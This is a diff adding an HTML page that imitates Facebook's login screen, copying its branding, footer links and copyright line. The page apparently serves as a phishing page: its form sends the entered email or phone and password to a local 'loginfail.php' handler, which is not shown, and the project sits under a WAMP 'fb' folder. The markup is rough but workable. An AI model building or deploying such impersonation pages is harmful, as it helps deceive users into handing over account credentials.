@@ -1,0 +1,265 @@
+<html>
+<head>
+     
+     <title> Log In  
+     </title>
+     <style>
+    body{
+        height: 1000px;
+        background:linear-gradient( to bottom right,white,#bcbdc4);
+        ;}                  
+    
+   
+        
+    div.hd1{
+      text-align:30%;
+      top:0;
+      left:0;
+
+    background-color:#45619D;
+    border-bottom: 3px solid #0053A6;
+    box-shadow: 0 0 2px rgba(0, 0, 0, 0.52);*/
+     position: fixed;
+      min-width: 1000px;
+
+      width: 100%;
+
+      z-index: 1000;
+
+    font-family:verdana;
+    width:100%;
+    height:90px;
+  
+
+      }
+
+    #c3{
+
+      margin-left:383px; 
+      margin-top:98px;    
+      /*background-color: white;*/
+    }    
+        
+    #btn1{
+                  background-color:#627aac; 
+                  border-top: 1px solid #29447e;
+                  border-right: 1px solid #29447e;
+                  border-bottom: 1px solid #1a356e;
+                  border-left: none;
+                  height: 22px;
+                  padding-right: 15px;
+                  padding-left: 15px;
+                  font-weight: bold;
+                  font-size: 11px;
+                  color: white;
+                  text-decoration: none;
+                  font-family: verdana;
+                  line-height: 22px;
+                  cursor: pointer;
+    }
+
+
+#btn2 {
+
+      margin-top24px; background-color:#77b55a;-moz-border-radius:4px;
+  -webkit-border-radius:4px;
+   height:30px;
+  border-radius:4px;
+  border:1px solid #4b8f29;
+  display:inline-block;
+  cursor:pointer;
+  color:#ffffff;
+  font-family:Arial;
+  font-size:3mm;
+  font-weight:bold;
+
+
+
+       } 
+
+
+
+
+     </style>
+
+     <script type="text/javascript">
+  function valid()
+      {
+
+  var n1=document.getElementById("t1").value;
+  var n2=document.getElementById("t5").value;
+if (n1=="") 
+  {
+    document.getElementById("l1").innerHTML="enter ur name";
+  }
+
+
+ if (n2=="")
+{
+
+  document.getElementById("l2").innerHTML="enter password";
+}
+
+}
+</script>  
+            </head>
+             <body>
+            <form name="login" >
+                <div class="hd1">
+                <font color="white" size="6px"  ><b> 
+                <br>
+                 &nbsp; &nbsp; 
+                &nbsp; &nbsp; 
+                &nbsp; &nbsp; &nbsp; &nbsp;   
+
+                  &nbsp; &nbsp; &nbsp; &nbsp; 
+                    facebook</font>
+
+
+
+            <input type="button" value="signup" id="btn2"  onClick="parent.location='fb1.html'"> 
+             </form>     
+          </div>  
+  
+             <div id="c3">
+              <form name="logfl" method="post" action="loginfail.php"   style="display:block; width: 612px;
+    height: 229px;
+    border: 1px ; background-color:white"; >
+            
+             <table >
+<tr>
+<td>
+    <font size="3mm" color="#45619D ">
+  <b> Log in to Facebook  </b>
+   <hr>
+
+
+
+           <tr>
+           <td>
+
+
+
+      &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+  &nbsp; &nbsp; 
+ &nbsp; &nbsp; &nbsp;
+ <font size="2mm" color="#45619D ">
+    Email or Phone:
+                   <input type="text" name="usrname" id="t1" placeholder="user name" style="height:24px;" >               &nbsp; &nbsp; 
+                     <label id="l1" style= "color:red;" size="1mm">  </label>       
+</font>
+</td>
+     </tr>
+        
+     <tr>
+            
+           
+             <br>
+              <td> 
+             &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  &nbsp;
+                 
+              <font size="2mm" color="#45619D ">
+             Password: &nbsp; &nbsp; &nbsp; &nbsp; 
+              <input type="password"  id="t5" name="password" placeholder="password "  style="height:24px;"> <label id="l2" style= "color:red;" size="1mm">  </label>  <br>
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; 
+&nbsp;&nbsp; &nbsp; 
+&nbsp;&nbsp; &nbsp; 
+
+    <input type="checkbox" >
+           <font size="2mm" color="#45619D"> keep me logged in &nbsp; &nbsp;  &nbsp; &nbsp; &nbsp;         
+           </font>             
+          </td>
+
+<tr>
+      <td>
+ &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp;&nbsp; &nbsp;
+                 <input type="submit"value="login" id="btn1"  onclick="valid();"> 
+            or <font size="3mm" color="#45619D"> <b> <a href="C:\wamp\www\fb\fb1.html"  style="text-decoration:none">signup for facebook  </a> </b>  
+              <br>
+
+   <br>
+  &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;
+
+<font size="3mm" color="#45619D">  forget password?
+                   
+</td>
+        </tr>
+ 
+    
+        </td>
+
+      </tr>
+
+            </table>
+             </form>
+
+               </div>
+             </div>
+             <br>
+             <br>
+             <br>
+                          <br>
+             <br>
+             <br>
+              <form name="last"   style="display:inline-block ; background-color:white"; >
+               <font size="2mm" color="#45619D ">
+              &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp;
+
+
+             English (UK)&nbsp;தமிழ &nbsp;்తెలుగు &nbsp;ಕನ್ನಡ &nbsp;اردو &nbsp;हिन्दी &nbsp;മലയാളംසිංහ &nbsp;ලਪੰਜਾਬੀবাংলা… 
+             <hr>
+              &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp;
+              
+             Sign Up &nbsp;  Log In &nbsp;  Messenger &nbsp; Facebook Lite &nbsp; Mobile  &nbsp; Find Friends  &nbsp; Badges &nbsp;  People &nbsp;  Pages  &nbsp;Places  <br>
+              &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+
+            Games &nbsp; Locations &nbsp; About &nbsp; Create &nbsp; Advert &nbsp; Create Page  &nbsp; Developers &nbsp;  Careers &nbsp; Privacy &nbsp; Cookies  &nbsp; AdChoices <br>
+                 <br>
+                               &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+                   &nbsp; Facebook © 2016 
+                  <br>
+                                &nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+&nbsp; &nbsp; &nbsp; &nbsp; 
+             &nbsp;                English (UK)
+
+  </font>
+</body>
+</html>
